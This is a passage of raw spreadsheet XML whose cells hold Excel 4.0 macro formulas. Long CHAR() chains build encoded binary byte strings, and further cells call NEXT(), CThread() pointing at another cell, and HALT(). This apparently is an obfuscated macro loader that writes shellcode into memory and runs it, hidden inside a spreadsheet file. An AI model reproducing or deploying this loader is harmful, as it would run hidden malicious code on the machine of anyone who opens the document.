mp;CHAR(225)&amp;CHAR(71)&amp;CHAR(211)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(143)&amp;CHAR(34)&amp;CHAR(200)&amp;CHAR(85)&amp;CHAR(60)&amp;CHAR(14)&amp;CHAR(216)&amp;CHAR(96)&amp;CHAR(226)&amp;CHAR(231)&amp;CHAR(192)&amp;CHAR(118)&amp;CHAR(214)&amp;CHAR(223)&amp;CHAR(114)&amp;CHAR(12)&amp;CHAR(31)&amp;CHAR(114)&amp;CHAR(53)&amp;CHAR(114)&amp;CHAR(154)&amp;CHAR(220)&amp;CHAR(83)&amp;CHAR(11)&amp;CHAR(128)&amp;CHAR(164)&amp;CHAR(30)&amp;CHAR(80)&amp;CHAR(180)&amp;CHAR(4)&amp;CHAR(116)&amp;CHAR(26)&amp;CHAR(207)&amp;CHAR(211)&amp;CHAR(220)&amp;CHAR(239)&amp;CHAR(110)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(112)&amp;CHAR(203)&amp;CHAR(180)&amp;CHAR(171)&amp;CHAR(95)&amp;CHAR(57)&amp;CHAR(77)&amp;CHAR(211)&amp;CHAR(206)&amp;CHAR(128)&amp;CHAR(143)&amp;CHAR(249)&amp;CHAR(201)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(66)&amp;CHAR(10)&amp;CHAR(228)&amp;CHAR(158)&amp;CHAR(235)&amp;CHAR(100)&amp;CHAR(19)&amp;CHAR(115)&amp;CHAR(54)&amp;CHAR(230)&amp;CHAR(136)&amp;CHAR(109)&amp;CHAR(250)&amp;CHAR(62)&amp;CHAR(142)&amp;CHAR(134)&amp;CHAR(179)&amp;CHAR(201)&amp;CHAR(89)&amp;CHAR(90)&amp;CHAR(54)&amp;CHAR(178)&amp;CHAR(103)&amp;CHAR(253)&amp;CHAR(123)&amp;CHAR(25)&amp;CHAR(35)&amp;CHAR(176)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(215)&amp;CHAR(47)&amp;CHAR(7)&amp;CHAR(58)&amp;CHAR(178)&amp;CHAR(51)&amp;CHAR(76)&amp;CHAR(89)&amp;CHAR(8)&amp;CHAR(54)&amp;CHAR(155)&amp;CHAR(203)&amp;CHAR(94)&amp;CHAR(204)&amp;CHAR(48)&amp;CHAR(159)&amp;CHAR(16)&amp;CHAR(78)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(81)&amp;CHAR(114)&amp;CHAR(120)&amp;CHAR(253)&amp;CHAR(115)&amp;CHAR(64)&amp;CHAR(172)&amp;CHAR(89)&amp;CHAR(76)&amp;CHAR(146)&amp;CHAR(143)&amp;CHAR(247)&amp;CHAR(60)&amp;CHAR(34)&amp;CHAR(25)&amp;CHAR(143)&amp;CHAR(130)&amp;CHAR(230)&amp;CHAR(128)&amp;CHAR(140)&amp;CHAR(130)&amp;CHAR(157)&amp;CHAR(113)&amp;CHAR(101)&amp;CHAR(4)&amp;CHAR(79)&amp;CHAR(192)&amp;CHAR(56)&amp;CHAR(100)&amp;CHAR(127)&amp;CHAR(43)&amp;CHAR(224)&amp;CHAR(169)&amp;CHAR(8)&amp;CHAR(232)&amp;CHAR(123)&amp;CHAR(86)&amp;CHAR(57)&amp;CHAR(68)&amp;CHAR(106)&amp;CHAR(222)&amp;CHAR(40)&amp;CHAR(53)&amp;CHAR(91)&amp;CHAR(54)&amp;CHAR(138)&amp;CHAR(209)&amp;CHAR(150)&amp;CHAR(219)&amp;CHAR(182)&amp;CHAR(159)&amp;CHAR(94)&amp;CHAR(166)&amp;CHAR(140)&amp;CHAR(53)&amp;CHAR(234)&amp;CHAR(194)&amp;CHAR(191)&amp;CHAR(137)&amp;CHAR(214)&amp;CHAR(185)&amp;CHAR(173)&amp;CHAR(197)&amp;CHAR(58)&amp;CHAR(238)&amp;CHAR(205)&amp;CHAR(227)&amp;CHAR(115)&amp;CHAR(97)&amp;CHAR(221)&amp;CHAR(118)&amp;CHAR(235)&amp;CHAR(146)&amp;CHAR(98)&amp;CHAR(59)&amp;CHAR(85)&amp;CHAR(219)&amp;CHAR(6)&amp;CHAR(116)&amp;CHAR(229)&amp;CHAR(154)</f>
        <v>_x0014_°Ï9j«ê@},_x0018__x001D_…Œ­¥anjv×óyÅ_x0010_ü-]wnG$,¨«#¹a_x0008_‰±Ö¸_x0007_l…Û*îÜ­MËáÒá„_x0008_TMÔ!ÞáGÓÃ¹"ÈU&lt;_x000E_Ø`âçÀvÖßr_x000C__x001F_r5ršÜS_x000B_€¤_x001E_P´_x0004_t_x001A_ÏÓÜïn_x0004_ƒpË´«_9MÓÎ€ùÉv'B
äžëd_x0013_s6æˆmú&gt;Ž†³ÉYZ6²gý{_x0019_#°¼_x0001_×/_x0007_:²3LY_x0008_6›Ë^Ì0Ÿ_x0010_NˆQrxýs@¬YL’÷&lt;"_x0019_‚æ€Œ‚qe_x0004_OÀ8d+à©_x0008_è{V9DjÞ(5[6ŠÑ–Û¶Ÿ^¦Œ5êÂ¿‰Ö¹­Å:îÍãsaÝvë’b;UÛ_x0006_tåš</v>
      </c>
      <c r="C17" t="str">
        <f>CHAR(56)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(173)&amp;CHAR(105)&amp;CHAR(46)&amp;CHAR(207)&amp;CHAR(234)&amp;CHAR(22)&amp;CHAR(177)</f>
        <v>8±Ö­i.Ïê_x0016_±</v>
      </c>
    </row>
    <row r="18" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A18" t="b">
        <f>NEXT()</f>
        <v>1</v>
      </c>
      <c r="B18" t="str">
        <f>CHAR(248)&amp;CHAR(50)&amp;CHAR(237)&amp;CHAR(140)&amp;CHAR(159)&amp;CHAR(136)&amp;CHAR(99)&amp;CHAR(89)&amp;CHAR(82)&amp;CHAR(64)&amp;CHAR(238)&amp;CHAR(192)&amp;CHAR(58)&amp;CHAR(201)&amp;CHAR(54)&amp;CHAR(26)&amp;CHAR(154)&amp;CHAR(136)&amp;CHAR(151)&amp;CHAR(41)&amp;CHAR(27)&amp;CHAR(119)&amp;CHAR(119)&amp;CHAR(39)&amp;CHAR(241)&amp;CHAR(250)&amp;CHAR(20)&amp;CHAR(204)&amp;CHAR(152)&amp;CHAR(128)&amp;CHAR(112)&amp;CHAR(241)&amp;CHAR(9)&amp;CHAR(125)&amp;CHAR(171)&amp;CHAR(45)&amp;CHAR(122)&amp;CHAR(246)&amp;CHAR(15)&amp;CHAR(20)&amp;CHAR(29)&amp;CHAR(63)&amp;CHAR(165)&amp;CHAR(32)&amp;CHAR(227)&amp;CHAR(88)&amp;CHAR(95)&amp;CHAR(2)&amp;CHAR(225)&amp;CHAR(170)&amp;CHAR(153)&amp;CHAR(168)&amp;CHAR(134)&amp;CHAR(193)&amp;CHAR(252)&amp;CHAR(54)&amp;CHAR(42)&amp;CHAR(105)&amp;CHAR(224)&amp;CHAR(196)&amp;CHAR(226)&amp;CHAR(30)&amp;CHAR(158)&amp;CHAR(126)&amp;CHAR(141)&amp;CHAR(94)&amp;CHAR(73)&amp;CHAR(155)&amp;CHAR(74)&amp;CHAR(103)&amp;CHAR(227)&amp;CHAR(31)&amp;CHAR(202)&amp;CHAR(144)&amp;CHAR(11)&amp;CHAR(204)&amp;CHAR(149)&amp;CHAR(150)&amp;CHAR(52)&amp;CHAR(149)&amp;CHAR(3)&amp;CHAR(191)&amp;CHAR(57)&amp;CHAR(151)&amp;CHAR(159)&amp;CHAR(111)&amp;CHAR(122)&amp;CHAR(183)&amp;CHAR(166)&amp;CHAR(219)&amp;CHAR(16)&amp;CHAR(86)&amp;CHAR(25)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(132)&amp;CHAR(241)&amp;CHAR(166)&amp;CHAR(72)&amp;CHAR(223)&amp;CHAR(123)&amp;CHAR(11)&amp;CHAR(119)&amp;CHAR(103)&amp;CHAR(200)&amp;CHAR(64)&amp;CHAR(237)&amp;CHAR(180)&amp;CHAR(151)&amp;CHAR(219)&amp;CHAR(170)&amp;CHAR(202)&amp;CHAR(157)&amp;CHAR(137)&amp;CHAR(152)&amp;CHAR(43)&amp;CHAR(48)&amp;CHAR(79)&amp;CHAR(8)&amp;CHAR(213)&amp;CHAR(15)&amp;CHAR(243)&amp;CHAR(114)&amp;CHAR(207)&amp;CHAR(150)&amp;CHAR(153)&amp;CHAR(45)&amp;CHAR(223)&amp;CHAR(19)&amp;CHAR(100)&amp;CHAR(122)&amp;CHAR(86)&amp;CHAR(203)&amp;CHAR(182)&amp;CHAR(142)&amp;CHAR(166)&amp;CHAR(39)&amp;CHAR(210)&amp;CHAR(144)&amp;CHAR(124)&amp;CHAR(31)&amp;CHAR(29)&amp;CHAR(222)&amp;CHAR(46)&amp;CHAR(24)&amp;CHAR(70)&amp;CHAR(201)&amp;CHAR(249)&amp;CHAR(173)&amp;CHAR(21)&amp;CHAR(225)&amp;CHAR(34)&amp;CHAR(68)&amp;CHAR(200)&amp;CHAR(224)&amp;CHAR(108)&amp;CHAR(73)&amp;CHAR(126)&amp;CHAR(111)&amp;CHAR(177)&amp;CHAR(225)&amp;CHAR(158)&amp;CHAR(52)&amp;CHAR(99)&amp;CHAR(74)&amp;CHAR(51)&amp;CHAR(149)&amp;CHAR(42)&amp;CHAR(94)&amp;CHAR(101)&amp;CHAR(182)&amp;CHAR(125)&amp;CHAR(196)&amp;CHAR(233)&amp;CHAR(201)&amp;CHAR(201)&amp;CHAR(113)&amp;CHAR(24)&amp;CHAR(212)&amp;CHAR(47)&amp;CHAR(180)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(178)&amp;CHAR(60)&amp;CHAR(80)&amp;CHAR(36)&amp;CHAR(135)&amp;CHAR(25)&amp;CHAR(29)&amp;CHAR(186)&amp;CHAR(188)&amp;CHAR(158)&amp;CHAR(63)&amp;CHAR(41)&amp;CHAR(24)&amp;CHAR(81)&amp;CHAR(233)&amp;CHAR(54)&amp;CHAR(36)&amp;CHAR(163)&amp;CHAR(127)&amp;CHAR(136)&amp;CHAR(178)&amp;CHAR(135)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(52)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(125)&amp;CHAR(243)&amp;CHAR(54)&amp;CHAR(173)&amp;CHAR(39)&amp;CHAR(116)&amp;CHAR(46)&amp;CHAR(138)&amp;CHAR(104)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(252)&amp;CHAR(143)&amp;CHAR(6)&amp;CHAR(32)&amp;CHAR(211)&amp;CHAR(107)&amp;CHAR(101)&amp;CHAR(82)&amp;CHAR(12)&amp;CHAR(135)&amp;CHAR(159)&amp;CHAR(56)&amp;CHAR(151)&amp;CHAR(116)&amp;CHAR(228)&amp;CHAR(102)&amp;CHAR(15)&amp;CHAR(239)&amp;CHAR(106)&amp;CHAR(13)&amp;CHAR(45)&amp;CHAR(204)&amp;CHAR(179)&amp;CHAR(28)&amp;CHAR(1)&amp;CHAR(105)&amp;CHAR(129)&amp;CHAR(208)&amp;CHAR(170)&amp;CHAR(39)&amp;CHAR(200)&amp;CHAR(105)&amp;CHAR(86)&amp;CHAR(53)</f>
        <v>ø2íŒŸˆcYR@îÀ:É6_x001A_šˆ—)_x001B_ww'ñú_x0014_Ì˜€pñ	}«-zö_x000F__x0014__x001D_?¥ ãX__x0002_áª™¨†Áü6*iàÄâ_x001E_ž~^I›Jgã_x001F_Ê_x000B_Ì•–4•_x0003_¿9—Ÿoz·¦Û_x0010_V_x0019_!Á„ñ¦Hß{_x000B_wgÈ@í´—ÛªÊ‰˜+0O_x0008_Õ_x000F_órÏ–™-ß_x0013_dzVË¶Ž¦'Ò|_x001F__x001D_Þ._x0018_FÉù­_x0015_á"DÈàlI~o±áž4cJ3•*^e¶}ÄéÉÉq_x0018_Ô/´½w²&lt;P$‡_x0019__x001D_º¼ž?)_x0018_Qé6$£ˆ²‡_x0014_f4"‰}ó6­'t.Šhæöü_x0006_ ÓkeR_x000C_‡Ÿ8—täf_x000F_ïj_x000D_-Ì³_x001C__x0001_iÐª'ÈiV5</v>
      </c>
      <c r="C18" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(222)&amp;CHAR(243)&amp;CHAR(227)&amp;CHAR(170)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(226)&amp;CHAR(237)</f>
        <v>ÖÈÞóãªv:âí</v>
      </c>
    </row>
    <row r="19" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A19">
        <f>CThread(0,0,A10,0,0,0)</f>
        <v>5292</v>
      </c>
      <c r="B19" t="str">
        <f>CHAR(131)&amp;CHAR(236)&amp;CHAR(30)&amp;CHAR(141)&amp;CHAR(209)&amp;CHAR(141)&amp;CHAR(31)&amp;CHAR(206)&amp;CHAR(26)&amp;CHAR(175)&amp;CHAR(223)&amp;CHAR(110)&amp;CHAR(246)&amp;CHAR(62)&amp;CHAR(1)&amp;CHAR(74)&amp;CHAR(148)&amp;CHAR(109)&amp;CHAR(233)&amp;CHAR(91)&amp;CHAR(245)&amp;CHAR(164)&amp;CHAR(94)&amp;CHAR(151)&amp;CHAR(239)&amp;CHAR(133)&amp;CHAR(202)&amp;CHAR(19)&amp;CHAR(242)&amp;CHAR(37)&amp;CHAR(254)&amp;CHAR(9)&amp;CHAR(220)&amp;CHAR(64)&amp;CHAR(88)&amp;CHAR(57)&amp;CHAR(231)&amp;CHAR(53)&amp;CHAR(60)&amp;CHAR(213)&amp;CHAR(14)&amp;CHAR(30)&amp;CHAR(3)&amp;CHAR(207)&amp;CHAR(60)&amp;CHAR(252)&amp;CHAR(211)&amp;CHAR(141)&amp;CHAR(248)&amp;CHAR(134)&amp;CHAR(110)&amp;CHAR(10)&amp;CHAR(33)&amp;CHAR(90)&amp;CHAR(231)&amp;CHAR(69)&amp;CHAR(90)&amp;CHAR(3)&amp;CHAR(182)&amp;CHAR(4)&amp;CHAR(101)&amp;CHAR(9)&amp;CHAR(94)&amp;CHAR(9)&amp;CHAR(123)&amp;CHAR(63)&amp;CHAR(18)&amp;CHAR(22)&amp;CHAR(182)&amp;CHAR(60)&amp;CHAR(152)&amp;CHAR(95)&amp;CHAR(22)&amp;CHAR(244)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(212)&amp;CHAR(101)&amp;CHAR(176)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(184)&amp;CHAR(12)&amp;CHAR(93)&amp;CHAR(249)&amp;CHAR(208)&amp;CHAR(143)&amp;CHAR(168)&amp;CHAR(106)&amp;CHAR(52)&amp;CHAR(240)&amp;CHAR(244)&amp;CHAR(119)&amp;CHAR(57)&amp;CHAR(75)&amp;CHAR(225)&amp;CHAR(241)&amp;CHAR(8)&amp;CHAR(182)&amp;CHAR(42)&amp;CHAR(48)&amp;CHAR(77)&amp;CHAR(58)&amp;CHAR(191)&amp;CHAR(126)&amp;CHAR(43)&amp;CHAR(56)&amp;CHAR(16)&amp;CHAR(208)&amp;CHAR(81)&amp;CHAR(38)&amp;CHAR(76)&amp;CHAR(38)&amp;CHAR(11)&amp;CHAR(54)&amp;CHAR(145)&amp;CHAR(81)&amp;CHAR(65)&amp;CHAR(254)&amp;CHAR(45)&amp;CHAR(183)&amp;CHAR(136)&amp;CHAR(196)&amp;CHAR(199)&amp;CHAR(138)&amp;CHAR(168)&amp;CHAR(4)&amp;CHAR(253)&amp;CHAR(205)&amp;CHAR(102)&amp;CHAR(36)&amp;CHAR(114)&amp;CHAR(208)&amp;CHAR(98)&amp;CHAR(91)&amp;CHAR(41)&amp;CHAR(168)&amp;CHAR(152)&amp;CHAR(2)&amp;CHAR(74)&amp;CHAR(218)&amp;CHAR(105)&amp;CHAR(230)&amp;CHAR(100)&amp;CHAR(156)&amp;CHAR(108)&amp;CHAR(84)&amp;CHAR(99)&amp;CHAR(141)&amp;CHAR(118)&amp;CHAR(18)&amp;CHAR(126)&amp;CHAR(236)&amp;CHAR(191)&amp;CHAR(115)&amp;CHAR(108)&amp;CHAR(228)&amp;CHAR(39)&amp;CHAR(148)&amp;CHAR(46)&amp;CHAR(103)&amp;CHAR(217)&amp;CHAR(27)&amp;CHAR(150)&amp;CHAR(206)&amp;CHAR(95)&amp;CHAR(206)&amp;CHAR(239)&amp;CHAR(228)&amp;CHAR(162)&amp;CHAR(234)&amp;CHAR(227)&amp;CHAR(221)&amp;CHAR(223)&amp;CHAR(217)&amp;CHAR(122)&amp;CHAR(235)&amp;CHAR(245)&amp;CHAR(192)&amp;CHAR(103)&amp;CHAR(179)&amp;CHAR(162)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(232)&amp;CHAR(244)&amp;CHAR(34)&amp;CHAR(129)&amp;CHAR(55)&amp;CHAR(138)&amp;CHAR(120)&amp;CHAR(101)&amp;CHAR(211)&amp;CHAR(43)&amp;CHAR(69)&amp;CHAR(24)&amp;CHAR(77)&amp;CHAR(100)&amp;CHAR(33)&amp;CHAR(206)&amp;CHAR(206)&amp;CHAR(8)&amp;CHAR(178)&amp;CHAR(146)&amp;CHAR(226)&amp;CHAR(219)&amp;CHAR(55)&amp;CHAR(3)&amp;CHAR(26)&amp;CHAR(114)&amp;CHAR(13)&amp;CHAR(200)&amp;CHAR(233)&amp;CHAR(236)&amp;CHAR(8)&amp;CHAR(176)&amp;CHAR(118)&amp;CHAR(170)&amp;CHAR(17)&amp;CHAR(119)&amp;CHAR(85)&amp;CHAR(15)&amp;CHAR(132)&amp;CHAR(9)&amp;CHAR(200)&amp;CHAR(177)&amp;CHAR(137)&amp;CHAR(16)&amp;CHAR(82)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(173)&amp;CHAR(101)&amp;CHAR(228)&amp;CHAR(193)&amp;CHAR(169)&amp;CHAR(27)&amp;CHAR(170)&amp;CHAR(67)&amp;CHAR(117)&amp;CHAR(153)&amp;CHAR(142)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(168)&amp;CHAR(135)&amp;CHAR(90)&amp;CHAR(192)&amp;CHAR(221)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(64)&amp;CHAR(250)&amp;CHAR(178)&amp;CHAR(201)</f>
        <v>ƒì_x001E_Ñ_x001F_Î_x001A_¯ßnö&gt;_x0001_J”mé[õ¤^—ï…Ê_x0013_ò%þ	Ü@X9ç5&lt;Õ_x000E__x001E__x0003_Ï&lt;üÓø†n
!ZçEZ_x0003_¶_x0004_e	^	{?_x0012__x0016_¶&lt;˜__x0016_ôŒFÔe°
9¸_x000C_]ùÐ¨j4ðôw9Káñ_x0008_¶*0M:¿~+8_x0010_ÐQ&amp;L&amp;_x000B_6‘QAþ-·ˆÄÇŠ¨_x0004_ýÍf$rÐb[)¨˜_x0002_JÚiædœlTcv_x0012_~ì¿slä'”.gÙ_x001B_–Î_Îïä¢êãÝßÙzëõÀg³¢ß	èô"7ŠxeÓ+E_x0018_Md!ÎÎ_x0008_²’âÛ7_x0003__x001A_r_x000D_Èéì_x0008_°vª_x0011_wU_x000F_„	È±‰_x0010_R]ô­eäÁ©_x001B_ªCu™Ž"‰¨‡ZÀÝ&amp;.@ú²É</v>
      </c>
      <c r="C19" t="str">
        <f>CHAR(9)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(50)&amp;CHAR(16)&amp;CHAR(232)&amp;CHAR(104)&amp;CHAR(44)</f>
        <v xml:space="preserve">	¥ûÏv2_x0010_èh,</v>
      </c>
    </row>
    <row r="20" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A20" t="b">
        <f>HALT()</f>
        <v>1</v>
      </c>
      <c r="B20" t="str">
        <f>CHAR(46)&amp;CHAR(63)&amp;CHAR(71)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(183)&amp;CHAR(60)&amp;CHAR(150)&amp;CHAR(30)&amp;CHAR(249)&amp;CHAR(176)&amp;CHAR(202)&amp;CHAR(189)&amp;CHAR(178)&amp;CHAR(221)&amp;CHAR(85)&amp;CHAR(146)&amp;CHAR(77)&amp;CHAR(112)&amp;CHAR(22)&amp;CHAR(200)&amp;CHAR(247)&amp;CHAR(136)&amp;CHAR(58)&amp;CHAR(199)&amp;CHAR(128)&amp;CHAR(217)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(57)&amp;CHAR(239)&amp;CHAR(235)&amp;CHAR(254)&amp;CHAR(159)&amp;CHAR(158)&amp;CHAR(9)&amp;CHAR(89)&amp;CHAR(87)&amp;CHAR(148)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(237)&amp;CHAR(250)&amp;CHAR(70)&amp;CHAR(229)&amp;CHAR(119)&amp;CHAR(194)&amp;CHAR(57)&amp;CHAR(126)&amp;CHAR(22)&amp;CHAR(96)&amp;CHAR(26)&amp;CHAR(111)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(83)&amp;CHAR(166)&amp;CHAR(159)&amp;CHAR(143)&amp;CHAR(8)&amp;CHAR(15)&amp;CHAR(245)&amp;CHAR(238)&amp;CHAR(100)&amp;CHAR(244)&amp;CHAR(222)&amp;CHAR(225)&amp;CHAR(213)&amp;CHAR(185)&amp;CHAR(201)&amp;CHAR(101)&amp;CHAR(248)&amp;CHAR(17)&amp;CHAR(145)&amp;CHAR(94)&amp;CHAR(248)&amp;CHAR(217)&amp;CHAR(143)&amp;CHAR(4)&amp;CHAR(215)&amp;CHAR(100)&amp;CHAR(41)&amp;CHAR(206)&amp;CHAR(32)&amp;CHAR(106)&amp;CHAR(22)&amp;CHAR(174)&amp;CHAR(156)&amp;CHAR(235)&amp;CHAR(194)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(230)&amp;CHAR(178)&amp;CHAR(41)&amp;CHAR(169)&amp;CHAR(248)&amp;CHAR(138)&amp;CHAR(43)&amp;CHAR(112)&amp;CHAR(208)&amp;CHAR(58)&amp;CHAR(29)&amp;CHAR(164)&amp;CHAR(105)&amp;CHAR(137)&amp;CHAR(98)&amp;CHAR(153)&amp;CHAR(71)&amp;CHAR(16)&amp;CHAR(87)&amp;CHAR(55)&amp;CHAR(185)&amp;CHAR(93)&amp;CHAR(240)&amp;CHAR(127)&amp;CHAR(132)&amp;CHAR(58)&amp;CHAR(108)&amp;CHAR(108)&amp;CHAR(43)&amp;CHAR(104)&amp;CHAR(34)&amp;CHAR(133)&amp;CHAR(21)&amp;CHAR(10)&amp;CHAR(36)&amp;CHAR(75)&amp;CHAR(17)&amp;CHAR(156)&amp;CHAR(167)&amp;CHAR(128)&amp;CHAR(232)&amp;CHAR(174)&amp;CHAR(62)&amp;CHAR(131)&amp;CHAR(136)&amp;CHAR(54)&amp;CHAR(89)&amp;CHAR(144)&amp;CHAR(188)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(17)&amp;CHAR(62)&amp;CHAR(148)&amp;CHAR(173)&amp;CHAR(78)&amp;CHAR(30)&amp;CHAR(24)&amp;CHAR(13)&amp;CHAR(146)&amp;CHAR(108)&amp;CHAR(226)&amp;CHAR(69)&amp;CHAR(78)&amp;CHAR(166)&amp;CHAR(220)&amp;CHAR(198)&amp;CHAR(189)&amp;CHAR(213)&amp;CHAR(195)&amp;CHAR(151)&amp;CHAR(90)&amp;CHAR(231)&amp;CHAR(183)&amp;CHAR(38)&amp;CHAR(138)&amp;CHAR(163)&amp;CHAR(55)&amp;CHAR(12)&amp;CHAR(1)&amp;CHAR(107)&amp;CHAR(154)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(20)&amp;CHAR(168)&amp;CHAR(95)&amp;CHAR(119)&amp;CHAR(53)&amp;CHAR(150)&amp;CHAR(122)&amp;CHAR(144)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(207)&amp;CHAR(240)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(47)&amp;CHAR(183)&amp;CHAR(77)&amp;CHAR(104)&amp;CHAR(197)&amp;CHAR(233)&amp;CHAR(143)&amp;CHAR(106)&amp;CHAR(121)&amp;CHAR(146)&amp;CHAR(187)&amp;CHAR(176)&amp;CHAR(15)&amp;CHAR(80)&amp;CHAR(159)&amp;CHAR(160)&amp;CHAR(48)&amp;CHAR(4)&amp;CHAR(58)&amp;CHAR(158)&amp;CHAR(240)&amp;CHAR(92)&amp;CHAR(94)&amp;CHAR(55)&amp;CHAR(67)&amp;CHAR(15)&amp;CHAR(23)&amp;CHAR(222)&amp;CHAR(42)&amp;CHAR(110)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(43)&amp;CHAR(76)&amp;CHAR(107)&amp;CHAR(247)&amp;CHAR(220)&amp;CHAR(128)&amp;CHAR(108)&amp;CHAR(44)&amp;CHAR(29)&amp;CHAR(95)&amp;CHAR(33)&amp;CHAR(61)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(34)&amp;CHAR(108)&amp;CHAR(97)&amp;CHAR(2)&amp;CHAR(26)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(189)&amp;CHAR(123)&amp;CHAR(110)&amp;CHAR(166)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(95)&amp;CHAR(64)&amp;CHAR(181)&amp;CHAR(26)&amp;CHAR(228)</f>
        <v>.?GøT·&lt;–_x001E_ù°Ê½²ÝU’Mp_x0016_È÷ˆ:Ç€ÙE)9ïëþŸž	YW”E_x0005_íúFåwÂ9~_x0016_`_x001A_o_x0016_US¦Ÿ_x0008__x000F_õîdôÞáÕ¹Éeø_x0011_‘^øÙ_x0004_×d)Î j_x0016_®œëÂÂ†•æ²)©øŠ+pÐ:_x001D_¤i‰b™G_x0010_W7¹]ð„:ll+h"…_x0015_
$K_x0011_œ§€è®&gt;ƒˆ6Y¼_x000D__x0001__x0011_&gt;”­N_x001E__x0018__x000D_’lâEN¦ÜÆ½ÕÃ—Zç·&amp;Š£7_x000C__x0001_kšË_x0014_¨_w5–zúZÏð´­/·MhÅéjy’»°_x000F_PŸ 0_x0004_:žð\^7C_x000F__x0017_Þ*nûÏ+Lk÷Ü€l,_x001D__!=_x0008__x0002_"la_x0002__x001A_±Ö½{n¦_x0006__x000C__@µ_x001A_ä</v>
      </c>
      <c r="C20" t="str">
        <f>CHAR(11)&amp;CHAR(135)&amp;CHAR(179)&amp;CHAR(164)&amp;CHAR(122)&amp;CHAR(206)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(179)&amp;CHAR(66)</f>
        <v>_x000B_‡³¤zÎ!¥³B</v>
      </c>
    </row>
    <row r="21" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A21">
        <v>1342177280</v>
      </c>
      <c r="B21" t="str">
        <f>CHAR(210)&amp;CHAR(107)&amp;CHAR(2)&amp;CHAR(99)&amp;CHAR(232)&amp;CHAR(197)&amp;CHAR(187)&amp;CHAR(194)&amp;CHAR(100)&amp;CHAR(90)&amp;CHAR(231)&amp;CHAR(237)&amp;CHAR(24)&amp;CHAR(123)&amp;CHAR(183)&amp;CHAR(221)&amp;CHAR(93)&amp;CHAR(63)&amp;CHAR(64)&amp;CHAR(243)&amp;CHAR(51)&amp;CHAR(37)&amp;CHAR(37)&amp;CHAR(41)&amp;CHAR(35)&amp;CHAR(146)&amp;CHAR(182)&amp;CHAR(201)&amp;CHAR(93)&amp;CHAR(135)&amp;CHAR(145)&amp;CHAR(140)&amp;CHAR(148)&amp;CHAR(22)&amp;CHAR(43)&amp;CHAR(113)&amp;CHAR(129)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(164)&amp;CHAR(24)&amp;CHAR(137)&amp;CHAR(62)&amp;CHAR(4)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(109)&amp;CHAR(41)&amp;CHAR(124)&amp;CHAR(237)&amp;CHAR(17)&amp;CHAR(246)&amp;CHAR(173)&amp;CHAR(201)&amp;CHAR(114)&amp;CHAR(141)&amp;CHAR(13)&amp;CHAR(216)&amp;CHAR(65)&amp;CHAR(236)&amp;CHAR(232)&amp;CHAR(200)&amp;CHAR(117)&amp;CHAR(127)&amp;CHAR(42)&amp;CHAR(179)&amp;CHAR(114)&amp;CHAR(61)&amp;CHAR(16)&amp;CHAR(2)&amp;CHAR(213)&amp;CHAR(248)&amp;CHAR(111)&amp;CHAR(130)&amp;CHAR(86)&amp;CHAR(146)&amp;CHAR(53)&amp;CHAR(121)&amp;CHAR(191)&amp;CHAR(42)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(50)&amp;CHAR(202)&amp;CHAR(119)&amp;CHAR(247)&amp;CHAR(208)&amp;CHAR(192)&amp;CHAR(184)&amp;CHAR(165)&amp;CHAR(175)&amp;CHAR(53)&amp;CHAR(197)&amp;CHAR(127)&amp;CHAR(160)&amp;CHAR(114)&amp;CHAR(84)&amp;CHAR(125)&amp;CHAR(178)&amp;CHAR(184)&amp;CHAR(184)&amp;CHAR(1)&amp;CHAR(75)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(179)&amp;CHAR(159)&amp;CHAR(55)&amp;CHAR(213)&amp;CHAR(23)&amp;CHAR(198)&amp;CHAR(143)&amp;CHAR(61)&amp;CHAR(190)&amp;CHAR(190)&amp;CHAR(228)&amp;CHAR(82)&amp;CHAR(185)&amp;CHAR(214)&amp;CHAR(167)&amp;CHAR(127)&amp;CHAR(253)&amp;CHAR(252)&amp;CHAR(212)&amp;CHAR(22)&amp;CHAR(85)&amp;CHAR(165)&amp;CHAR(171)&amp;CHAR(245)&amp;CHAR(39)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(23)&amp;CHAR(27)&amp;CHAR(80)&amp;CHAR(48)&amp;CHAR(131)&amp;CHAR(127)&amp;CHAR(34)&amp;CHAR(195)&amp;CHAR(48)&amp;CHAR(243)